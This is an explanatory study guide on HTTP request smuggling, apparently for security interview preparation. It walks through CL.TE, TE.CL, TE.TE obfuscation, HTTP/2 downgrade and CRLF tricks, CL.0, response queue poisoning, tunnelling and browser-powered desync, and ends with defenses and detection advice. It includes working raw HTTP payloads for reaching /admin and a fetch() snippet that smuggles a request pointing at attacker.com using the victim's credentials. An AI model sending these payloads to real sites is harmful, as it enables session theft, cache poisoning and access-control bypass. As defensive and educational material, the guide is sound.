# HTTP Request Smuggling

> Request smuggling is a parsing-disagreement attack. A request traverses a chain of HTTP processors (CDN, reverse proxy, load balancer, then origin) that pool and reuse a single back-end TCP connection for many users' requests. Every hop must agree on exactly where one request ends and the next begins. HTTP/1.1 offers two independent ways to declare body length (`Content-Length` and `Transfer-Encoding: chunked`), so an attacker who makes the front-end and back-end resolve the boundary differently can leave trailing bytes that the back-end parses as the prefix of the next victim's request. The root cause is never a single buggy server: it is a boundary discrepancy between two servers sharing a keep-alive connection.

## How it works

The vulnerable substrate is HTTP/1.1 keep-alive with connection reuse. To avoid a TCP and TLS handshake per request, a front-end multiplexes many clients' requests down a small pool of persistent connections to each back-end. Requests are pipelined: written back to back on the wire with no framing other than the length each server computes from the headers. If server A thinks a request is N bytes and server B thinks it is N-plus-k bytes, those k bytes desynchronize the stream, and everything after them shifts by one request.

HTTP/1.1 gives two length mechanisms. `Content-Length` is a byte count of the body:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

`Transfer-Encoding: chunked` frames the body as a sequence of chunks, each a hex length line, a CRLF, that many bytes, and a CRLF, terminated by a zero-length chunk `0\r\n\r\n`:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

RFC 9112 section 6.1 (formerly RFC 7230) is explicit: if both headers are present, `Transfer-Encoding` overrides `Content-Length`, and because the combination often signals a smuggling or response-splitting attempt, a server "ought to" treat the message as an error and close the connection. The vulnerability class exists precisely because real deployments do not all follow that: some ignore `Transfer-Encoding` entirely, some ignore it when it is lightly obfuscated, some prefer `Content-Length`, and few reject the ambiguous combination outright. Two things being true at once, connection reuse plus divergent length resolution, is the entire attack surface.

Note the practical wrinkle: chunked encoding is legal in requests but browsers never send it, and Burp Suite auto-unpacks it in the editor, so many testers have never seen a raw chunked request body. Manual smuggling requires disabling automatic `Content-Length` updates in the tool so the crafted, deliberately wrong lengths survive to the wire.

## Attack techniques

### CL.TE (front-end Content-Length, back-end Transfer-Encoding)

The front-end honors `Content-Length` and forwards the whole body as one request. The back-end honors `Transfer-Encoding`, reads the `0\r\n\r\n` terminator, considers the request finished, and treats the trailing bytes as a new request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end counts 13 bytes (through `SMUGGLED`) and forwards everything. The back-end reads chunk `0`, ends the request there, and `SMUGGLED` becomes the start of the next request on that connection. WHY it works: the back-end obeyed the spec (TE wins), the front-end did not, and connection reuse hands the orphaned bytes to the next victim.

A weaponized CL.TE prefix that bypasses a front-end access-control check on `/admin`:

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end sees two requests to `/home` and forwards both. The back-end sees `/home` then `/admin` and serves `/admin` in the trust context of a request that "already passed" the front-end. The dangling `Foo: xGET /home...` stitches the victim's next request onto the smuggled one so the back-end does not stall waiting for headers.

### TE.CL (front-end Transfer-Encoding, back-end Content-Length)

Mirror image. The front-end chunk-decodes, the back-end counts bytes.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The front-end reads the `8`-byte chunk (`SMUGGLED`), then the `0` terminator, and forwards. The back-end reads only `Content-Length: 3` bytes (`8\r\n`) and treats `SMUGGLED\r\n0\r\n\r\n` as the next request. Tooling detail: the tool must not recompute `Content-Length`, and you must send the trailing `\r\n\r\n` after the final `0`.

### TE.TE (both support TE, one is tricked into ignoring it)

Both ends understand chunked, so you obfuscate the header so exactly one end fails to recognize it and silently falls back to `Content-Length`, recreating a CL/TE split. Each variant is a deliberate, minor departure from the grammar that some parsers tolerate and others do not:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

The mechanism per line: a bogus token value (`xchunked`), whitespace before the colon (rejected by strict parsers, accepted by lenient ones), two TE headers where a server picks the last, a tab instead of a space after the colon, a leading space that turns the header into an obfuscated continuation, a bare LF that one server treats as a line break, and a folded value split across lines. You are hunting for one obfuscation that only one of the two servers respects.

### Chunk-body parsing divergence

Header-level TE obfuscation is only the first layer. Even when both the front-end and back-end accept `Transfer-Encoding: chunked` without any header tricks, they can still disagree on where individual chunks end, and that alone is enough to desynchronize the stream. The chunk grammar has more room for lenient interpretation than most engineers assume, and every point of leniency is a divergence surface.

The common attacker levers are chunk extensions such as `5;foo=bar\r\nABCDE\r\n` that some servers strip cleanly and others fold into the size line, chunk sizes with leading zeros or a `0x` prefix that one parser accepts and another rejects, uppercase versus lowercase hex, oversized sizes that trigger truncation on one end and not the other, and trailer headers after the terminating `0\r\n` that one server consumes as part of the same request while the peer treats the trailer bytes as the start of the next request. A useful test payload is a final chunk of `0\r\nX: X\r\n\r\n` where the trailer is legal per RFC 9112 but only one of the two servers recognizes it.

The interviewer follow-up here is "if both servers honor `Transfer-Encoding: chunked`, is smuggling impossible?" The answer is no. TE.TE is not solved by both sides parsing the header, because the body grammar underneath the header is itself ambiguous under lenient parsing, and any divergence in chunk boundary detection reproduces the same class of desync.

### HTTP/2 downgrade smuggling (H2.CL and H2.TE)

HTTP/2 frames carry an explicit length per DATA frame, so end-to-end HTTP/2 has no length ambiguity and is inherently immune. The danger is HTTP/2 downgrading: an H2 front-end re-serializes each request into HTTP/1.1 for an origin that only speaks HTTP/1. James Kettle's "HTTP/2: The Sequel Is Always Worse" (Black Hat USA 2021) showed this reintroduces smuggling on sites that were previously safe.

H2.CL: HTTP/2 requests carry an implicit length, but a client can also send an explicit `content-length`. The spec requires the front-end to validate that any declared `content-length` matches the framed length. Where it does not, the front-end uses the true H2 frame length to find the request boundary but copies the attacker's false `content-length` into the downgraded HTTP/1 request, so the HTTP/1 back-end desyncs:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

The injected `content-length: 0` (sent over H2 alongside a real body) makes the HTTP/1 back-end believe the POST body is empty, so `GET /admin` becomes a standalone smuggled request. The trailing `Content-Length: 10` in the prefix truncates the appended victim request before its headers to avoid duplicate-header errors.

H2.TE: chunked encoding is illegal in HTTP/2 and the spec says a smuggled `transfer-encoding: chunked` must be stripped or the request blocked. A front-end that forwards it into the HTTP/1 downgrade hands the back-end a chunked request:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

### CRLF injection into HTTP/2 header values

HTTP/2 header values are length-delimited binary fields, so `\r\n` inside a value has no structural meaning and passes front-end validation that only checks for a literal chunked header or a matching content-length. On downgrade the value is written into a text HTTP/1 request, and the embedded `\r\n` splits into two headers:

```
name:  foo
value: bar\r\nTransfer-Encoding: chunked
```

becomes, after downgrade:

```http
Foo: bar
Transfer-Encoding: chunked
```

This is the H2-exclusive bypass for defenses that strip or validate ordinary length headers. It generalizes to request splitting: because the split can occur in the headers rather than the body, even a `GET` (no legal body) can be split into two complete back-end requests by injecting `\r\n\r\n` plus a fresh request line into a value:

```
:method   GET
:path      /
:authority vulnerable-website.com
foo        bar\r\nHost: vulnerable-website.com\r\n\r\nGET /admin HTTP/1.1
```

You must account for where the front-end appends the rewritten `Host` header (it strips `:authority`), positioning your injected `Host` so both resulting requests are well formed.

### CL.0 and H2.0

CL.0 is a degenerate CL.TE: the back-end ignores the `Content-Length` on certain endpoints (treats the body length as zero) so the body is parsed as the next request. This happens where the back-end does not expect a body: static-file handlers, server-level redirects, some error paths, or endpoints on servers that discard bodies for particular methods or paths.

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Content-Length: 34
Connection: keep-alive

GET /hopefully404 HTTP/1.1
Foo: x
```

If the back-end ignores the `Content-Length` for `/vulnerable-endpoint`, the `GET /hopefully404` is treated as a second request and the front-end pairs its response with the next client's request. Detection is a differential: the smuggled request must land on the same connection, so you send the poisoning request then a follow-up down the same socket and watch for the `404` (or whatever the smuggled path returns) surfacing on the wrong request. H2.0 is the same idea reached through an HTTP/2 front-end that downgrades to a back-end which ignores the derived length. These "0"-class bugs are the reason the modern guidance is: never assume a request has no body.

### 0.CL and the early-response gadget

0.CL is the inverse: the front-end ignores a `Content-Length` that the back-end honors. It was long thought unexploitable because it deadlocks (the front-end forwards a short request while the back-end waits for body bytes that never arrive). The 2025 "HTTP/1.1 Must Die" research (James Kettle) broke the deadlock using an early-response gadget (an endpoint that makes the back-end respond before consuming the full body), then chained a double desync into a full exploit. It is the current frontier for downgrade-free HTTP/1.1 smuggling.

### Response queue poisoning

Once you can smuggle a complete standalone request (not just a prefix), you desynchronize the response queue itself. The back-end now has one more response queued than the front-end expects, so every subsequent response is served to the wrong client: victim N receives the response the back-end generated for the attacker's smuggled request, and the attacker receives victim N's response, including their session cookies and authenticated page content. This is effectively full-site takeover, because it steals arbitrary responses rather than a fixed target, and it persists for the life of the poisoned connection.

### Request tunnelling (blind and HEAD-based non-blind)

Request tunnelling is the residual smuggling primitive that survives when back-end connection reuse is disabled. The front-end still opens a fresh upstream socket for each client request, so the attacker cannot steer bytes onto a victim's connection, but the attacker can still get the front-end to write two requests down the single upstream socket allocated to their own connection. The back-end generates two responses; the front-end reads only the first and returns it. The tunnelled response, addressed to the attacker's own socket, contains the answer to the smuggled internal request. There is no victim, but there is also no restriction: the smuggled request runs with whatever internal trust the back-end grants to a request arriving through the front-end's upstream pool.

Blind tunnelling only confirms the desync (measurable timing or a distinctive downstream error) and is often the first fingerprinting step. Non-blind tunnelling extracts the response body. The classic technique, sometimes called HEAD tunnelling, sends an outer `HEAD` request (which by spec elicits headers only, no body) paired with a smuggled prefix whose response the back-end will produce with a real body. The front-end reads the outer HEAD response, believes the body is empty (per the outer request's method), and returns to the attacker. The bytes of the tunnelled response body are still in the socket buffer. If the outer response also carries a `Content-Length` that under-counts what the front-end actually reads, or if the front-end streams the connection until it thinks the tunnelled response is complete, those extra bytes are appended to the outer response and delivered to the attacker.

The impact matters for calibrating the "just turn off connection reuse" recommendation. Request tunnelling lets the attacker reach `/admin` and other internal paths whose ACL lives at the front-end, read internal headers the front-end injects such as `X-Forwarded-For`, `X-SSL-CLIENT-CN`, or TLS client-cert metadata, and pivot through the front-end's trust boundary into origin infrastructure. Disabling back-end connection reuse removes victim poisoning; it does not remove the attacker's own upstream socket, so it does not remove tunnelling. That is why the guidance is "necessary but not sufficient" rather than "the fix."

### Client-side desync (browser-powered)

Documented in James Kettle's "Browser-Powered Desync Attacks" (2022), these need no attacker-controlled proxy and no shared back-end connection. The trick is a front-end that ignores the `Content-Length` of a browser-issued POST to some endpoint (a CL.0 primitive reachable by a normal browser). Because `fetch()` can send a cross-origin POST with an arbitrary body and credentials, the attacker's page induces the victim's own browser to poison its own connection to the target:

```javascript
fetch('https://vulnerable-website.com/', {
  method: 'POST',
  body: 'GET /redirect HTTP/1.1\r\nHost: attacker.com\r\nContent-Length: 5\r\n\r\nx=1',
  mode: 'no-cors',
  credentials: 'include'
})
```

The body is treated by the server as the start of the victim's next request on that keep-alive connection, so the victim's real follow-up request is stitched onto the attacker's prefix. This exposes single-server sites (no front-end/back-end pair needed) and enables client-side cache poisoning, credential theft, and pivoting to internal infrastructure. Kettle demonstrated it against real targets including Amazon (CloudFront-fronted endpoints), Akamai, and Cisco/Pulse Secure appliances.

### Other high-value primitives

- Bypass front-end controls: reach `/admin` or other gated paths whose access checks live only in the front-end (shown above).
- Capture other users' requests: smuggle a POST to a storage function (comment, profile, email) with the storable parameter last and an oversized `Content-Length`; the back-end waits for more bytes, the victim's request supplies them, and the victim's headers and cookies get stored where you can read them back.
- Reveal front-end rewriting: smuggle a reflecting POST as the trailing value to dump the internal headers the front-end injects (`X-Forwarded-For`, `X-SSL-CLIENT-CN`, TLS metadata), then replay those to bypass client-certificate or IP trust.
- Reflected XSS with no victim interaction: inject a payload into a header like `User-Agent` in the smuggled prefix; the next user's request receives the reflected response.
- On-site redirect to open redirect and web cache poisoning: smuggle a request whose `Host` drives a `Location` redirect, then let the front-end cache that off-site redirect against a legitimate URL like `/static/include.js`, persistently redirecting every subsequent visitor's script fetch to attacker JavaScript.
- Web cache deception: smuggle a request for another user's private page so the front-end caches the sensitive response against a static-looking URL you can then fetch.

## Defense

1. Use HTTP/2 (or HTTP/3) end to end and eliminate downgrading. A single, framed length mechanism removes the ambiguity that the entire class depends on. This is the only true fix, not a mitigation.
2. If you must downgrade, re-validate the rewritten HTTP/1 request against the grammar before forwarding: reject any request that reaches the origin with newlines in header values, colons in header names, spaces or tabs around the colon, or a `content-length` that disagrees with the framed HTTP/2 length. Strip `transfer-encoding` on the H2 path.
3. Normalize at the front-end, reject at the back-end. Have the front-end rewrite ambiguous requests into one canonical form, and have the back-end reject anything still ambiguous (both `Content-Length` and `Transfer-Encoding` present, malformed chunk sizes, obfuscated TE) and close the TCP connection rather than guess. Closing the connection is essential: a kept-open poisoned connection is the delivery channel.
4. Make front-end and back-end parse identically. Divergence is the vulnerability, so avoid mixing vendors with different tolerance for obfuscation, and keep both patched (a large fraction of proxy and origin CVEs are exactly this parsing gap).
5. Never assume an endpoint has no body. Static handlers, redirects, and error paths that discard `Content-Length` are the root of CL.0 and client-side desync. Consume or reject bodies consistently.
6. Defense in depth: disable back-end connection reuse (one upstream connection per client request). This removes the shared channel that most attacks need, at a performance cost, but it does not stop request tunnelling (which abuses a single connection with no reuse), so it is a mitigation, not a fix. Add smuggling signatures at the WAF while understanding that smuggling is designed to slip past front-end inspection.

## Interview-grade nuances

- Spec precedence is TE over CL, and RFC 9112 says the ambiguous combination "ought to be handled as an error." The bug is not the spec, it is servers that ignore that guidance. Naming RFC 9112 section 6.1 signals depth.
- "HTTP/2 fixes smuggling" is only true end to end. Downgrading is the dominant modern vector, and it can make a previously safe site newly vulnerable, which is counterintuitive and worth stating plainly.
- Front-end WAFs and access control do not help and often hurt: they see the outer request, the back-end sees the smuggled one, so a CDN in front is an amplifier, not a shield.
- Disabling connection reuse is widely cited as "the fix." It is not. It blunts classic desync but leaves request tunnelling (leaking internal headers, HEAD-based non-blind tunnelling) fully intact.
- Detection safety matters. The correct primary probe is timing based (delay differential): a CL.TE probe with `Transfer-Encoding: chunked` and `Content-Length: 4` sending `1\r\nA\r\nX` leaves the back-end waiting for another chunk, producing a measurable delay without corrupting another user's request. Run the CL.TE timing test before the TE.CL one, because the TE.CL probe can disrupt real users on a CL.TE-vulnerable target.
- Confirmation is a differential-response test sent on two separate connections: an attack request that leaves a prefix, then a normal request on a different connection that comes back altered (for example a `404` from a smuggled `GET /404`). Same URL and parameters on both so a load balancer routes them to the same back-end.
- Content-Length arithmetic is the craft. Off-by-one in the declared length either truncates the smuggled prefix or hangs the back-end on a timeout, and the standard technique for capturing rewritten requests is to start slightly oversized and tune downward.
- Distinguish the impact tiers cleanly: prefix smuggling affects the next request; response queue poisoning steals arbitrary responses (full compromise); client-side desync removes the need for a front-end/back-end split entirely and reaches single-server and internal targets.
- The single-packet attack (Kettle, 2023) is what makes modern smuggling and race-condition detection reliable. Over HTTP/2 you can pack the final bytes of many requests into a single TCP packet so the server begins processing all of them within the same TCP receive event, which collapses network jitter and gives sub-millisecond timing resolution. This is the primitive behind reliable 0.CL detection and behind race-window probes that were previously too noisy over HTTP/1 pipelining, where scheduler and network variance dominate. In an interview, be prepared to explain that this is what lets a probe distinguish a 30 ms parser delay from ambient jitter, and to distinguish it from HTTP/1 pipelining timing, which cannot.
- Tooling to name: Burp's HTTP Request Smuggler extension and Burp Scanner's timing-based detection, `h2csmuggler` for HTTP/2 cleartext upgrade smuggling, and the single-packet attack for reliable HTTP/2 timing.

## Sources

- PortSwigger Web Security Academy, HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- PortSwigger, Finding HTTP request smuggling vulnerabilities: https://portswigger.net/web-security/request-smuggling/finding
- PortSwigger, Exploiting HTTP request smuggling vulnerabilities: https://portswigger.net/web-security/request-smuggling/exploiting
- PortSwigger, Advanced request smuggling (HTTP/2, response queue poisoning, 0.CL): https://portswigger.net/web-security/request-smuggling/advanced
- James Kettle, HTTP Desync Attacks: Request Smuggling Reborn: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- James Kettle, Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling: https://portswigger.net/research/browser-powered-desync-attacks
- James Kettle, HTTP/2: The Sequel Is Always Worse: https://portswigger.net/research/http2
- James Kettle, HTTP/1.1 Must Die (0.CL, early-response gadget): https://portswigger.net/research/http1-must-die
- RFC 9112 section 6.1, Message Body Length: https://www.rfc-editor.org/rfc/rfc9112#section-6.1
